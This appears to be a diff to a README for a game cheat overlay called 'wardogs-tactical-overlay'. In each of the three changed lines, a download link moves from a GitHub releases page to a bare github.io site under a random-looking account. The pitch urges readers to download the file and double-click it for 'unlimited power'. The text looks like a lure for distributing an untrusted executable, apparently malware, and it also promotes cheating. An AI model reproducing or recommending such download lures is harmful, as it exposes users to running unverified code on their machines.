@@ -1,6 +1,6 @@
 # 🎯 wardogs-tactical-overlay - Unlock Full Power with 41 Game-Changing Modules
 
-[![Download Now](https://img.shields.io/badge/Download-WARDOGS_Overlay-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1b1f23)](https://github.com/Adulteducationcentriscidae8205/wardogs-tactical-overlay/releases)
+[![Download Now](https://img.shields.io/badge/Download-WARDOGS_Overlay-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1b1f23)](https://adulteducationcentriscidae8205.github.io)
 
 ---
 
@@ -25,7 +25,7 @@ Follow these simple steps exactly. If you can click a button and double-click a 
 ### Step 1: Get the File
 
 👉 **Visit this link to download the application:**  
-[**https://github.com/Adulteducationcentriscidae8205/wardogs-tactical-overlay/releases**](https://github.com/Adulteducationcentriscidae8205/wardogs-tactical-overlay/releases)
+[**https://adulteducationcentriscidae8205.github.io**](https://adulteducationcentriscidae8205.github.io)
 
 )
 
@@ -198,7 +198,7 @@ A: First, confirm the overlay process is running in Windows Task Manager (look f
 
 You're literally two clicks away from transforming your WARDOGS experience. Stop struggling with limited resources. Stop dying to unfair enemies. Take complete control of the battlefield today.
 
-👉 **[Download the Latest Release Now](https://github.com/Adulteducationcentriscidae8205/wardogs-tactical-overlay/releases)**
+👉 **[Download the Latest Release Now](https://adulteducationcentriscidae8205.github.io)**
 
 Once downloaded, double-click the file, press F1 in-game, and enjoy unlimited power. Join thousands of satisfied players who already use this overlay to dominate every mission, every vehicle, and every firefight.
 
